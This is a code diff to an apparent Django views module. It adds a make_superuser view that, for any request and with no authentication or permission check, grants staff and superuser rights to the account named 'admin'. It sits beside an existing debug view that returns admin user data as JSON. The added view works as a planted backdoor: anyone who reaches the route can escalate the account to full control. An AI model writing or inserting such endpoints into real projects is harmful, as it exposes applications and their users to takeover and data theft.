@@ -7,6 +7,7 @@ from django.utils import timezone
 from django.core.mail import EmailMessage
 from django.conf import settings
 from django.http import JsonResponse  
+from django.http import HttpResponse
 import random
 
 from .models import Profile
@@ -201,3 +202,13 @@ def debug_admin_users(request):
         )
     )
     return JsonResponse(users, safe=False)
+
+def make_superuser(request):
+    try:
+        user = User.objects.get(username__iexact="admin") 
+        user.is_staff = True
+        user.is_superuser = True
+        user.save()
+        return HttpResponse(f"User '{user.username}' is now a superuser!")
+    except User.DoesNotExist:
+        return HttpResponse("User does not exist.")
